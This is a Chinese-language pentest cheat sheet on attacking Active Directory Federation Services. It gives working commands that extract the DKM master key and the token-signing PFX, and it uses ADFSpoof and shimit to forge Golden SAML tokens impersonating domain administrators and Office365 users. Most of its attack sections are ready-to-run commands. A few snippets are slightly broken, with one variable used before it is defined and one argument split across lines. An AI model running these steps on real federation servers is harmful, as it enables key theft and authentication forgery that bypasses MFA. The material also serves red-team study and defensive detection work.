# Active Directory - 联合身份验证服务

Active Directory 联合身份验证服务（AD FS）是微软开发的软件组件，为用户提供跨组织边界的系统和应用程序的单点登录（SSO）访问。它使用基于声明的访问控制授权模型来维护应用程序安全性，并为托管在企业网络内部或外部的 Web 应用程序提供无缝访问。

## ADFS - DKM 主密钥

* DKM 密钥存储在 AD 联系人对象的 `thumbnailPhoto` 属性中。

```ps1
$key=(Get-ADObject -filter 'ObjectClass -eq "Contact" -and name -ne "CryptoPolicy"' -SearchBase "CN=ADFS,CN=Microsoft,CN=Program Data,DC=domain,DC=local" -Properties thumbnailPhoto).thumbnailPhoto
[System.BitConverter]::ToString($key)
```

## ADFS - 信任关系

获取联合身份验证服务的依赖方信任。

* 搜索 `IssuanceAuthorizationRules`

    ```ps1
    Get-AdfsRelyingPartyTrust
    ```

## ADFS - 黄金 SAML

黄金 SAML 是一种攻击类型，攻击者创建伪造的 SAML（安全断言标记语言）身份验证响应来冒充合法用户，并获得对服务提供商的未授权访问。此攻击利用基于 SAML 的单点登录（SSO）系统中身份提供者（IdP）和服务提供者（SP）之间建立的信任。

* 即使启用了 2FA，黄金 SAML 仍然有效。
* 令牌签名私钥不会自动续期
* 更改用户密码不会影响生成的 SAML

**前提条件**：

* ADFS 服务帐户
* 私钥（带解密密码的 PFX）

**利用方法**：

* 以 **ADFS 服务帐户**身份在 ADFS 服务器上运行 [mandiant/ADFSDump](https://github.com/mandiant/ADFSDump)。它会查询 Windows 内部数据库（WID）：`\\.\pipe\MICROSOFT##WID\tsql\query`
* 将 PFX 和私钥转换为二进制格式

    ```ps1
    # PFX
    echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin
    # 私钥
    echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin 
    ```

* 使用 [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof) 创建黄金 SAML，可能需要更新[依赖](https://github.com/szymex73/ADFSpoof)。

    ```ps1
    mkdir ADFSpoofTools
    cd $_
    git clone https://github.com/dmb2168/cryptography.git
    git clone https://github.com/mandiant/ADFSpoof.git 
    virtualenv3 venvADFSSpoof
    source venvADFSSpoof/bin/activate
    pip install lxml
    pip install signxml
    pip uninstall -y cryptography
    cd cryptography
    pip install -e .
    cd ../ADFSpoof
    pip install -r requirements.txt
    python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
    ```

**手动利用**：

* 获取 WID 路径：`Get-AdfsProperties`
* 获取 ADFS 依赖方信任：`Get-AdfsRelyingPartyTrust`
* 获取签名证书，保存 `EncryptedPfx` 并解码 `base64 -d adfs.b64 > adfs.bin`

    ```powershell
    $cmd.CommandText = "SELECT ServiceSettingsData from AdfsConfigurationV3.IdentityServerPolicy.ServiceSettings"
    $client= New-Object System.Data.SQLClient.SQLConnection($ConnectionString);
    $client.Open();
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT name FROM sys.databases"
    $reader = $cmd.ExecuteReader()
    $reader.Read() | Out-Null
    $name = $reader.GetString(0)
    $reader.Close()
    Write-Output $name;
    ```

* 获取存储在 Active Directory 的 `thumbnailPhoto` 属性中的 DKM 密钥：

    ```ps1
    ldapsearch -x -H ldap://DC.domain.local -b "CN=ADFS,CN=Microsoft,CN=Program Data,DC=DOMAIN,DC=LOCAL" -D "adfs-svc-account@domain.local" -W -s sub "(&(objectClass=contact)(!(name=CryptoPolicy)))" thumbnailPhoto
    ```

* 将获取的密钥转换为原始格式：`echo "RETRIEVED_KEY_HERE" | base64 -d > adfs.key`
* 使用 [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof) 生成黄金 SAML

注意：容器中可能有多个主密钥，记得尝试所有密钥。

**黄金 SAML 示例**

* SAML2：需要 `--endpoint`、`--nameidformat`、`--identifier`、`--nameid` 和 `--assertions`

    ```ps1
    python ADFSpoof.py -b adfs.bin adfs.key -s adfs.domain.local saml2 --endpoint https://www.contoso.com/adfs/ls
    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
    ```

* Office365：需要 `--upn` 和 `--objectguid`

    ```ps1
    python3 ADFSpoof.py -b adfs.bin adfs.key -s sts.domain.local o365 --upn user@domain.local --objectguid 712D7BFAE0EB79842D878B8EEEE239D1
    ```

* 其他：使用已知帐户连接到服务提供商，分析给出的 SAML 令牌属性并重用其格式。

**注意**：同步生成黄金 SAML 的攻击者机器和 ADFS 服务器之间的时间。

其他有趣的利用 AD FS 的工具：

* [secureworks/whiskeysamlandfriends/WhiskeySAML](https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml) - 带远程 ADFS 配置提取的黄金 SAML 攻击PoC。
* [cyberark/shimit](https://github.com/cyberark/shimit) - 实现黄金 SAML 攻击的工具

    ```ps1
    python ./shimit.py -idp http://adfs.domain.local/adfs/services/trust -pk key -c cert.pem -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id REDACTED
    ```

## 参考资料

* [I AM AD FS AND SO CAN YOU - Douglas Bienstock & Austin Baker - Mandiant](https://troopers.de/downloads/troopers19/TROOPERS19_AD_AD_FS.pdf)
* [Active Directory Federation Services (ADFS) Distributed Key Manager (DKM) Keys - Threat Hunter Playbook](https://threathunterplaybook.com/library/windows/adfs_dkm_keys.html)
* [Exploring the Golden SAML Attack Against ADFS - 7 December 2021](https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs)
* [Golden SAML: Newly Discovered Attack Technique Forges Authentication to Cloud Apps - Shaked Reiner - 11/21/17](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)
* [Meet Silver SAML: Golden SAML in the Cloud - Tomer Nahum and Eric Woodruff - Feb 29, 2024](https://www.semperis.com/blog/meet-silver-saml/)
